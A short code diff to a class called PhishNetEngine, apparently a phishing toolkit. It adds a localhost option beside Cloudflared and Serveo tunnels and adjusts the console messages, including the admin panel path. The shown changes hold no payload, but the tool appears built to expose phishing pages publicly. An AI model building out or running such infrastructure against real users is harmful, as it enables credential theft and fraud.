@@ -51,6 +51,7 @@ export class PhishNetEngine {
             name: 'tunnel',
             message: 'Select tunnel method:',
             choices: [
+                { name: 'Localhost (No Tunnel)', value: 'local' },
                 { name: 'Cloudflared', value: 'cf' },
                 { name: 'Serveo.net', value: 'sv' }
             ]
@@ -336,7 +337,9 @@ export class PhishNetEngine {
     }
 
     async showInfo() {
-        console.log(chalk.gray('\n[i] Starting tunnel...'));
+        if (this.tunnel !== 'local') {
+           console.log(chalk.gray('\n[i] Starting tunnel...'));
+        }
         
         try {
             let url;
@@ -344,13 +347,21 @@ export class PhishNetEngine {
             if (this.tunnel === 'cf') {
                 await this.cf.install();
                 url = await this.cf.start(this.port);
-            } else {
+            } 
+            else if (this.tunnel === 'sv') {
                 url = await this.sv.start(this.port);
+            } else {
+                   url = `http://localhost:${this.port}`;
             }
-            
-            console.log(chalk.green('[+] Tunnel active\n'));
-            console.log(chalk.cyan('   Public URL:'), url);
-            console.log(chalk.cyan('   Local URL:'), `http://localhost:${this.port}`);
+
+            if (this.tunnel === 'local') {
+               console.log(chalk.green('[+] Running on localhost\n'));
+               console.log(chalk.cyan('   Local URL:'), `http://localhost:${this.port}`);
+            } else {
+                console.log(chalk.green('[+] Tunnel active\n'));
+                console.log(chalk.cyan('   Public URL:'), url);
+                console.log(chalk.cyan('   Local URL:'), `http://localhost:${this.port}`);
+            }
             
             const adminPath = '/admin-' + CONFIG.adminToken;
             console.log(chalk.yellow('\n[!] Admin Panel:'));
